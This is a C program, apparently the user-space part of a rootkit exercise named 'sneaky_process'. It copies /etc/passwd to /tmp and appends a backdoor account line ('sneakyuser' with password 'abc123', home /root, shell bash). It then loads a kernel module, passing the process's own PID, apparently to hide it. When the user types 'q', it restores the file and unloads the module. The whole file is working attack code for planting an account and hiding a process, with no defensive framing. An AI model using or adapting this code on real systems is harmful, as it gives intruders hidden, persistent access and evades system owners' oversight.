#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

void copyFileContents(const char * from, const char * to) {
  FILE * originalFile = fopen(from, "r");
  FILE * newFile = fopen(to, "w");
  //Copy the original files contents and then later append to it
  size_t linecap;
  char * curr = NULL;
  //Read line by line and then copy it to the newFile
  while (getline(&curr, &linecap, originalFile) >= 0) {
    fprintf(newFile, "%s", curr);
    free(curr);
    curr = NULL;
  }
  free(curr);
  fclose(originalFile);
  fclose(newFile);
}

/*
 *This function is supposed to copy the file mentioned in the 
 *from parameter to the file mentioned in the to parameter
 */
void copyPasswordFile(const char * from, const char * to, const char * stringToWrite) {
  //Copy the contents of "from" file to "to" file
  copyFileContents(from, to);
  FILE * originalFile = fopen(from, "a");
  //Write the new string to the original file
  fprintf(originalFile, "%s", stringToWrite);
  fclose(originalFile);
}

int main() {
  int myPid = getpid();
  printf("sneaky_process pid=%d\n", myPid);
  copyPasswordFile(
      "/etc/passwd", "/tmp/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  char runCommand[100];
  sprintf(runCommand, "insmod sneaky_mod.ko value=%d", myPid);
  system(runCommand);
  char q = 'q';
  do {
    q = getchar();
    if (q == 'q') {
      q = 'q';
    }
  } while (q != 'q');
  //After the while loop ends:
  copyFileContents("/tmp/passwd", "/etc/passwd");
  system("rmmod sneaky_mod");
  system("rm /tmp/passwd");
  /* copyFileContents("./input_", "/etc/passwd"); */
  return 0;
}
